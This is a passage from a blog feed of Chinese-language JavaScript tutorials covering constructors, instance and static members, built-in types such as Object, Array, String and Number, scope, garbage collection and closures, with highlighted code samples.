class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params"></span>) &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;通过 new 也能调用函数...&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 调用函数</span></span><br><span class="line"><span class="keyword">new</span> foo;</span><br><span class="line"><span class="comment">// 创建构造函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Ultraman</span>(<span class="params">name</span>) &#123;</span><br><span class="line"><span class="variable language_">this</span>.<span class="property">name</span> = name</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 接受创建的对象</span></span><br><span class="line"><span class="keyword">const</span> man = <span class="keyword">new</span> <span class="title class_">Ultraman</span>(<span class="string">&#x27;Tiga&#x27;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(man) <span class="comment">// &#123;name: &#x27;Tiga&#x27;&#125;</span></span><br></pre></td></tr></table></figure><p>总结：</p><ol><li>使用 <code>new</code> 关键字调用函数的行为被称为<strong>实例化</strong></li><li>实例化构造函数时没有参数时可以省略 <code>()</code></li><li>构造函数内部无需写<code>return</code>，返回值即为新创建的对象</li><li>构造函数内部的 <code>return</code> 返回的值无效！</li><li><code>new Object()</code>、<code>new Data()</code>也是实例化构造函数</li></ol><h2 id="实例成员"><a href="#实例成员" class="headerlink" title="实例成员"></a>实例成员</h2><p>通过构造函数创建的对象称为<strong>实例对象</strong>，实例对象中的属性和方法称为<strong>实例成员</strong>。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params"></span>) &#123;</span><br><span class="line"><span class="comment">// 构造函数内部的 this 就是实例对象</span></span><br><span class="line"><span class="comment">// 实例对象中动态添加属性</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">name</span> = <span class="string">&#x27;小明&#x27;</span></span><br><span class="line"><span class="comment">// 实例对象动态添加方法</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">sayHi</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;大家好~&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 实例化，p1 是实例对象</span></span><br><span class="line"><span class="comment">// p1 实际就是 构造函数内部的 this</span></span><br><span class="line"><span class="keyword">const</span> p1 = <span class="keyword">new</span> <span class="title class_">Person</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p1)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p1.<span class="property">name</span>) <span class="comment">// 访问实例属性</span></span><br><span class="line">p1.<span class="title function_">sayHi</span>() <span class="comment">// 调用实例方法</span></span><br></pre></td></tr></table></figure><ol><li>实例对象的属性和方法即为实例成员</li><li>为构造函数传入参数，动态创建结构相同但值不同的对象</li><li>构造函数创建的实例对象彼此独立互不影响</li></ol><h2 id="静态成员"><a href="#静态成员" class="headerlink" title="静态成员"></a>静态成员</h2><p>在 JavaScript 中底层函数本质上也是对象类型，因此允许直接为函数动态添加属性或方法</p><p>构造函数的属性和方法被称为<strong>静态成员</strong>。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 构造函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params">name, age</span>) &#123;</span><br><span class="line"><span class="comment">// 省略实例成员</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 静态属性</span></span><br><span class="line"><span class="title class_">Person</span>.<span class="property">eyes</span> = <span class="number">2</span></span><br><span class="line"><span class="title class_">Person</span>.<span class="property">arms</span> = <span class="number">2</span></span><br><span class="line"><span class="comment">// 静态方法</span></span><br><span class="line"><span class="title class_">Person</span>.<span class="property">walk</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;^_^人都会走路...&#x27;</span>)</span><br><span class="line"><span class="comment">// this 指向 Person</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">eyes</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>构造函数的属性和方法被称为静态成员</li><li>一般公共特征的属性或方法静态成员设置为静态成员</li><li>静态成员方法中的<code>this</code>指向构造函数本身</li></ol><h1 id="内置构造函数"><a href="#内置构造函数" class="headerlink" title="内置构造函数"></a>内置构造函数</h1><p>在JavaScript当中<strong>最主要</strong>的数据类型有6种：</p><p><strong>基本数据类型</strong>：</p><ul><li>字符串、数值、布尔、undefined、null</li></ul><p><strong>引用类型</strong>：</p><ul><li>对象</li></ul><p>其实很多基本类型也有专门的构造函数，成为包装类型。</p><p>JS中几乎所有的数据都可以基于构造函数创建</p><p><strong>引用类型：</strong> Object、Array、RegExp、Date等</p><p><strong>包装类型：</strong> String、Number、Boolean等</p><h2 id="Object"><a href="#Object" class="headerlink" title="Object"></a>Object</h2><p><code>Object</code> 是内置的构造函数，用于<strong>创建普通对象</strong>。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 通过构造函数创建普通对象</span></span><br><span class="line"><span class="keyword">const</span> user = <span class="keyword">new</span> <span class="title class_">Object</span>(&#123;<span class="attr">name</span>: <span class="string">&#x27;kenan&#x27;</span>, <span class="attr">age</span>: <span class="number">12</span>&#125;)</span><br><span class="line"><span class="comment">// 字面体方式声明对象</span></span><br><span class="line"><span class="keyword">const</span> user = &#123; <span class="attr">name</span>: <span class="string">&#x27;kenan&#x27;</span>, <span class="attr">age</span>: <span class="number">12</span>&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> k <span class="keyword">in</span> user) &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(k) <span class="comment">// name age</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(user[k]) <span class="comment">// kenan 12</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Object.keys:</strong> 获取对象中所有的属性（键）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> user = &#123;<span class="attr">name</span>: <span class="string">&#x27;kenan&#x27;</span>, <span class="attr">age</span>: <span class="number">12</span>&#125;</span><br><span class="line"><span class="keyword">const</span> arr = <span class="title class_">Object</span>.<span class="title function_">keys</span>(user)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr) <span class="comment">// [&#x27;name&#x27;, &#x27;age&#x27;]</span></span><br></pre></td></tr></table></figure><p><strong>Object.values:</strong> 获取对象中所有的属性值</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> user = &#123;<span class="attr">name</span>: <span class="string">&#x27;kenan&#x27;</span>, <span class="attr">age</span>: <span class="number">12</span>&#125;</span><br><span class="line"><span class="keyword">const</span> arr = <span class="title class_">Object</span>.<span class="title function_">values</span>(user)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr) <span class="comment">// [&#x27;kenan&#x27;, 12]</span></span><br></pre></td></tr></table></figure><p><strong>Object.assign:</strong> 常用于对象拷贝</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> user = &#123;<span class="attr">name</span>: <span class="string">&#x27;kenan&#x27;</span>, <span class="attr">age</span>: <span class="number">12</span>&#125;</span><br><span class="line"><span class="keyword">const</span> obj = &#123;&#125;</span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">assign</span>(obj, user)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj) <span class="comment">// &#123;name: &#x27;kenan&#x27;, age: 12&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 典型用法，给对象添加属性</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">assign</span>(user, &#123;<span class="attr">gender</span>: <span class="string">&#x27;men&#x27;</span>&#125;)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(user) <span class="comment">// &#123;name: &#x27;kenan&#x27;, age: 12, gender: &#x27;men&#x27;&#125;</span></span><br></pre></td></tr></table></figure><p>总结：</p><ol><li>推荐使用字面量方式声明对象，而不是 <code>Object</code> 构造函数</li><li><code>Object.assign</code> 静态方法创建新的对象</li><li><code>Object.keys</code> 静态方法获取对象中所有属性</li><li><code>Object.values</code> 表态方法获取对象中所有属性值</li></ol><h2 id="Array"><a href="#Array" class="headerlink" title="Array"></a>Array</h2><p><code>Array</code>是内置的构造函数，用于<strong>创建数组</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> arr = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">2</span>, <span class="number">5</span>, <span class="number">0</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr) <span class="comment">// [2, 5, 0]</span></span><br><span class="line"><span class="comment">// 创建数组建议使用字面量创建，不用Array构造函数创建</span></span><br><span class="line"><span class="keyword">const</span> list = [<span class="number">2</span>, <span class="number">5</span>, <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p><strong>数组常见方法：</strong></p><table><thead><tr><th>方法</th><th>作用</th><th>说明</th></tr></thead><tbody><tr><td>forEach</td><td>遍历数组</td><td>不返回，用于不改变值，经常用于查找打印输出值</td></tr><tr><td>filter</td><td>过滤数组</td><td>筛选数组元素，并生成新数组</td></tr><tr><td>map</td><td>迭代数组</td><td>返回新数组，新数组里面的元素是处理之后的值，经常用于处理数据</td></tr><tr><td>reduce</td><td>累计器</td><td>返回函数累计处理的结果，经常用于求和等</td></tr></tbody></table><h3 id="reduce方法"><a href="#reduce方法" class="headerlink" title="reduce方法"></a>reduce方法</h3><p><strong>作用：</strong> <code>reduce</code> 返回函数累计处理的结果，常用于求和等<br><strong>基本用法：</strong> <code>arr.reduce(function(累计值, 当前元素)&#123;&#125;, 起始值)</code><br><strong>累计值参数：</strong> </p><ol><li>如果有起始值，则以起始值为准开始累计，累计值 &#x3D; 起始值</li><li>如果没有起始值，则累计值以数组的第一个数组元素作为起始值开始累计</li><li>后面每次遍历就会用后面的数组元素累计到 <strong>累计值</strong> 里面（类似求和里面的sum）</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> arr = [<span class="number">1</span>, <span class="number">5</span>, <span class="number">8</span>]</span><br><span class="line"><span class="comment">// 没有初始值</span></span><br><span class="line"><span class="keyword">const</span> total = arr.<span class="title function_">reduce</span>(<span class="keyword">function</span>(<span class="params">prev, current</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> prev + current</span><br><span class="line">&#125;)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(total) <span class="comment">// 14</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 有初始值</span></span><br><span class="line"><span class="keyword">const</span> total = arr.<span class="title function_">reduce</span>(<span class="keyword">function</span>(<span class="params">prev, current</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> prev + current</span><br><span class="line">&#125;, <span class="number">10</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(total) <span class="comment">// 24</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 用箭头函数写法</span></span><br><span class="line"><span class="keyword">const</span> total = arr.<span class="title function_">reduce</span>(<span class="function">(<span class="params">prev, current</span>) =&gt;</span> prev + current, <span class="number">20</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(total) <span class="comment">// 34</span></span><br></pre></td></tr></table></figure><p><strong>总结：</strong></p><ol><li>推荐使用字面量方式声明数组，而不是使用<code>Array</code>构造函数</li><li>实例方法 <code>forEach</code> 用于遍历数组，替代 <code>for</code> 循环</li><li>实例方法 <code>filter</code> 过滤数组单元值，生成新数组</li><li>实例方法 <code>map</code> 迭代原数组，生成新数组</li><li><code>join</code> ：数组元素拼接为字符串，返回字符串</li><li><code>find</code> ：查找元素，返回符合测试条件的第一个数组元素值，如果没有符合条件的则返回undefined</li><li><code>every</code> ：检测数组所有元素是否都符合指定条件，如果<strong>所有元素</strong>都通过检测返回true，否则返回false</li><li><code>some</code> ：检测数组中的元素是否满足指定条件，如果数组中有元素满足条件返回true，否则false</li><li><code>concat</code> ：合并两个数组，返回生成新数组</li><li><code>sort</code> ：对原数组单元值排序</li><li><code>splice</code> ：删除或替换原数组单元</li><li><code>reverse</code> ：反转数组</li><li><code>findIndex</code> ：查找元素的索引值</li></ol><h2 id="包装类型"><a href="#包装类型" class="headerlink" title="包装类型"></a>包装类型</h2><p>在 JavaScript 中的字符串、数值、布尔具有对象的使用特征，如具有属性和方法，如下代码举例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 字符串类型</span></span><br><span class="line"><span class="keyword">const</span> str = <span class="string">&#x27;hello world!&#x27;</span></span><br><span class="line"><span class="comment">// 统计字符的长度（字符数量）</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str.<span class="property">length</span>)</span><br><span class="line"><span class="comment">// 数值类型</span></span><br><span class="line"><span class="keyword">const</span> price = <span class="number">12.345</span></span><br><span class="line"><span class="comment">// 保留两位小数</span></span><br><span class="line">price.<span class="title function_">toFixed</span>(<span class="number">2</span>) <span class="comment">// 12.34</span></span><br></pre></td></tr></table></figure><p>之所以具有对象特征的原因是字符串、数值、布尔类型数据是 JavaScript 底层使用 Object 构造函数“包装”来的，被称为<strong>包装类型</strong>。</p><h3 id="String"><a href="#String" class="headerlink" title="String"></a>String</h3><p><code>String</code> 是内置的构造函数，用于<strong>创建字符串</strong>。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用构造函数创建字符串</span></span><br><span class="line"><span class="keyword">let</span> str = <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&#x27;hello world!&#x27;</span>);</span><br><span class="line"><span class="comment">// 字面量创建字符串</span></span><br><span class="line"><span class="keyword">let</span> str2 = <span class="string">&#x27;你好，世界！&#x27;</span>;</span><br><span class="line"><span class="comment">// 检测是否属于同一个构造函数</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str.<span class="property">constructor</span> === str2.<span class="property">constructor</span>); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str <span class="keyword">instanceof</span> <span class="title class_">String</span>); <span class="comment">// false</span></span><br></pre></td></tr></table></figure><p><strong>总结</strong>：</p><ol><li>实例属性 <code>length</code> 用来获取字符串的长度（重点）</li><li>实例方法 <code>split(&#39;分隔符&#39;)</code> 用来将字符串拆分成数组（重点）</li><li>实例方法 <code>substring（需要截取的第一个字符的索引[,结束的索引号]）</code> 用于字符串截取（重点）</li><li>实例方法 <code>startsWith(检测字符串[, 检测位置索引号])</code> 检测是否以某字符开头（重点）</li><li>实例方法 <code>includes(搜索的字符串[, 检测位置索引号])</code> 判断一个字符串是否包含在另一个字符串中，根据情况返回 <code>true</code> 或 <code>false</code>（重点）</li><li>实例方法 <code>toUpperCase</code> 用于将字母转换成大写</li><li>实例方法 <code>toLowerCase</code> 用于将就转换成小写</li><li>实例方法 <code>indexOf</code> 检测是否包含某字符</li><li>实例方法 <code>endsWith</code> 检测是否以某字符结尾</li><li>实例方法 <code>replace</code> 用于替换字符串，支持正则匹配</li><li>实例方法 <code>match</code> 用于查找字符串，支持正则匹配</li></ol><h3 id="Number"><a href="#Number" class="headerlink" title="Number"></a>Number</h3><p><code>Number</code> 是内置的构造函数，用于<strong>创建数值</strong>。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用构造函数创建数值</span></span><br><span class="line"><span class="keyword">let</span> x = <span class="keyword">new</span> <span class="title class_">Number</span>(<span class="string">&#x27;10&#x27;</span>)</span><br><span class="line"><span class="keyword">let</span> y = <span class="keyword">new</span> <span class="title class_">Number</span>(<span class="number">5</span>)</span><br><span class="line"><span class="comment">// 字面量创建数值</span></span><br><span class="line"><span class="keyword">let</span> z = <span class="number">3.14159</span></span><br><span class="line"><span class="comment">// 保留两位小数，四舍五入</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(z.<span class="title function_">toFixed</span>(<span class="number">2</span>))  <span class="comment">// 3.14</span></span><br></pre></td></tr></table></figure><p><strong>总结</strong>：</p><ol><li>推荐使用字面量方式声明数值，而不是 <code>Number</code> 构造函数</li><li>实例方法 <code>toFixed</code> 用于设置保留小数位的长度</li></ol>]]></content>
      
      
      <categories>
          
          <category> 前端开发 </category>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript-作用域、解构、箭头函数</title>
      <link href="/2024/03/07/JavaScript-%E4%BD%9C%E7%94%A8%E5%9F%9F%E3%80%81%E8%A7%A3%E6%9E%84%E3%80%81%E7%AE%AD%E5%A4%B4%E5%87%BD%E6%95%B0/"/>
      <url>/2024/03/07/JavaScript-%E4%BD%9C%E7%94%A8%E5%9F%9F%E3%80%81%E8%A7%A3%E6%9E%84%E3%80%81%E7%AE%AD%E5%A4%B4%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h1><h2 id="局部作用域"><a href="#局部作用域" class="headerlink" title="局部作用域"></a>局部作用域</h2><p>局部作用域分为函数作用域和块作用域。</p><h3 id="函数作用域"><a href="#函数作用域" class="headerlink" title="函数作用域"></a>函数作用域</h3><p>在函数内部声明的变量只能在函数内部被访问，外部无法直接访问。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">counter</span>(<span class="params">x, y</span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> s = x + y</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(s)</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 设用 counter 函数</span></span></span><br><span class="line"><span class="language-javascript"><span class="title function_">counter</span>(<span class="number">10</span>, <span class="number">8</span>)</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 访问变量 s</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(s)<span class="comment">// 报错</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>总结：</p><ol><li>函数内部声明的变量，在函数外部无法被访问</li><li>函数的参数也是函数内部的局部变量</li><li>不同函数内部声明的变量无法互相访问</li><li>函数执行完毕后，函数内部的变量实际被清空了</li></ol><h3 id="块作用域"><a href="#块作用域" class="headerlink" title="块作用域"></a>块作用域</h3><p>在JavaScript中使用<code>&#123;&#125;</code>包裹的代码成为代码块，代码块内部声明的变量外部将<strong>有可能</strong>无法被访问</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> t = <span class="number">1</span>; t &lt; <span class="number">6</span>; t++) &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(t) <span class="comment">//正常运行</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(t) <span class="comment">//报错</span></span><br></pre></td></tr></table></figure><p>总结：</p><ol><li><code>let</code> 声明的变量会产生块作用域，<code>var</code> 不会产生块作用域</li><li><code>const</code> 声明的常量也会产生块作用域</li><li>不同代码块之间的变量无法互相访问</li><li>推荐使用 <code>let</code> 或 <code>const</code></li></ol><h2 id="全局作用域"><a href="#全局作用域" class="headerlink" title="全局作用域"></a>全局作用域</h2><p><code>&lt;script&gt;</code> 标签和 <code>.js</code> 文件的<strong>最外层</strong>就是所谓的全局作用域，在此声明的变量在函数内部也可以被访问。</p><p>全局作用域中声明的变量，任何其他作用域都可以被访问</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> num = <span class="number">10</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">fn</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="comment">//函数内部可以访问全局作用域的变量</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(num)</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>总结：</p><ol><li>为 <code>window</code> 对象动态添加的属性默认也是全局的，不推荐！</li><li>函数中未使用任何关键字声明的变量为全局变量，不推荐！</li><li>尽可能少的声明全局变量，防止全局变量被污染</li></ol><h2 id="作用域链"><a href="#作用域链" class="headerlink" title="作用域链"></a>作用域链</h2><p>作用域链本质上是底层的变量查找机制</p><ul><li>在函数被执行时，会优先在当前函数作用域内查找变量</li><li>如果当前作用域查找不到则会依次逐级查找父级作用域，直到全局作用域</li></ul><p>总结：</p><ol><li>嵌套关系的作用域串联起来形成了作用域链</li><li>相同作用域链中按着从小到大的规则查找变量</li><li>子作用域能够访问父作用域，父级作用域无法访问子级作用域</li></ol><h2 id="JS垃圾回收机制"><a href="#JS垃圾回收机制" class="headerlink" title="JS垃圾回收机制"></a>JS垃圾回收机制</h2><p>垃圾回收机制（Garbage Collection） 简称GC</p><p>JS中内存的分配和回收都是自动的，内存在不使用的时候会被系统自动回收</p><p>不在用到的内存，没有及时释放，就会造成<strong>内存泄漏</strong>（内存无法被回收）</p><p>JS环境中分配的内存，一般有以下生命周期：</p><ol><li>内存分配：当声明变量、函数、对象时，系统会自动为他们分配内存</li><li>内存使用：即读写内存，也就是使用变量、函数等</li><li>内存回收：使用完毕，由垃圾回收程序自动回收不再使用的内存</li><li>说明：<ul><li>全局变量一般不会回收（关闭页面时才回收）</li><li>一般情况下，局部变量的值不再被使用，就会被自动回收</li></ul></li></ol><p><strong>补充知识</strong>_堆栈空间分配区别：</p><ol><li>栈（操作系统）: 由操作系统自动分配释放函数的参数值、局部变量等，基本数据类型放到栈里面。</li><li>堆（操作系统）: 一般由程序员分配释放，若程序员不释放，由垃圾回收机制回收。复杂数据类型放到堆里面。</li></ol><p>两张常见的浏览器垃圾回收算法：<strong>引用计数法</strong>和<strong>标记清除法</strong></p><h3 id="引用计数法"><a href="#引用计数法" class="headerlink" title="引用计数法"></a>引用计数法</h3><p>IE采用的引用计数算法，定义“内存不再使用”，就是检查一个对象是否有指向它的引用，没有被引用则视为不再使用，就会回收</p><p>算法：</p><ol><li>跟踪记录被引用的次数</li><li>如果被引用一次，则即为1，每次引用会累加++</li><li>减少引用则累减–</li><li>如果引用数达到0时，则会释放内存</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line">arr = <span class="literal">null</span> <span class="comment">//原先arr指向数组，现在指向null，则原先的数组不再被引用，则被回收</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> person = &#123;</span><br><span class="line"><span class="attr">age</span>: <span class="number">18</span>,</span><br><span class="line"><span class="attr">name</span>: <span class="string">&#x27;牛马程序员&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> p = person  <span class="comment">//person记作一次引用</span></span><br><span class="line">person = <span class="number">1</span></span><br><span class="line">p = <span class="literal">null</span> <span class="comment">//不再被引用，对象被回收</span></span><br></pre></td></tr></table></figure><p>引用计数法存在一个致命的问题，就是嵌套引用（循环引用）</p><p>如果两个对象相互引用，尽管他们已经不再使用，垃圾回收器也不会进行回收，导致内存泄露</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">fn</span>(<span class="params"></span>) &#123;</span><br><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = &#123;&#125;</span><br><span class="line">o1.<span class="property">a</span> = o2</span><br><span class="line">o2.<span class="property">a</span> = o1</span><br><span class="line"><span class="comment">// 这种情况永远也不会被回收的</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解决这个问题就用到另外一种回收算法：<strong>标记清除法</strong></p><h3 id="标记清除法"><a href="#标记清除法" class="headerlink" title="标记清除法"></a>标记清除法</h3><p>现在的浏览器大多不再使用引用计数法，而是使用标记清除法</p><p>核心算法：</p><ol><li>标记清除算法将“不再使用的对象”定义为“无法到达的对象”</li><li>就是从根部（全局）出发定时地扫描内存中的对象，能够到达的对象则还需要使用</li><li>无法从根部到达的对象，会被标记为不再使用，会被回收</li></ol><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240307152812.png" alt="image.png"></p><ul><li>这就解决了引用计数法遇到循环引用的时候无法判断的情况</li></ul><h2 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h2><p>闭包是一种比较特殊的函数，使用闭包能够访问函数作用域中的变量。从代码形式上看闭包是一个做为返回值的函数，可以实现数据私有化。</p><p><strong>闭包 &#x3D; 内层函数 + 外层函数的变量</strong></p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240307153312.png" alt="image.png"></p><p>闭包的作用：</p><ul><li>封闭数据，实现数据私有，外部也可以访问函数内部的变量</li><li>闭包很有用，因为它允许将函数与其所操作的某些数据（环境）关联起来</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 